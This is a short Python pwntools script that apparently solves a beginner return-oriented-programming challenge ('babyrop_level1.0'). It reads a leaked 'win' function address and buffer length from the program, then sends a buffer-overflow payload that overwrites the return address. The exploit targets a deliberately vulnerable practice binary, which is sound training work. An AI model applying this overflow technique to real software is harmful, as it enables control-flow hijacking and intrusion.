#!usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF("/challenge/babyrop_level1.0")
io = elf.process()

# Retrieve the win function address from program output
io.recvuntil(b'; it is at 0x')
win_addr = p64(int(io.recvuntil(b'.')[:-1], 16))

# Retrieve the payload length from program output
io.recvuntil(b'input at least ')
buff_len = int(io.recvuntil(b' ')) - 8

# Build and send the payload to the program
PAYLOAD = b'A'*buff_len + win_addr
io.sendline(PAYLOAD)

# Print the program output
print(io.recvall().decode(errors='ignore'))